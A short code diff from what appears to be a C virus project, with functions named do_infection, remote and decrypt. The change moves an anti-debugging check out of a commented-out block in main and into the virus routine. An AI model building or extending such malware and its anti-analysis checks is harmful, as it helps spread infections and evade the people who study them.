@@ -54,6 +54,11 @@ void do_infection(){
 }
 
 int virus(int ac, char **av){
+	if (checkdebug())
+	{
+		CALL(WRITE, 1, "DEBUGGING..\n", 12);
+	}
+
  	if (opt.do_remote) remote();
  	if (opt.print_msg) println("[I am a bad virus]");
 
@@ -62,10 +67,5 @@ int virus(int ac, char **av){
 }
 
 int main(int ac, char **av){
-	/*if (checkdebug())
-	{
-		print("DEBUGGING..\n");
-		return 1;
-	}*/
 	return decrypt() && virus(ac, av);
 }
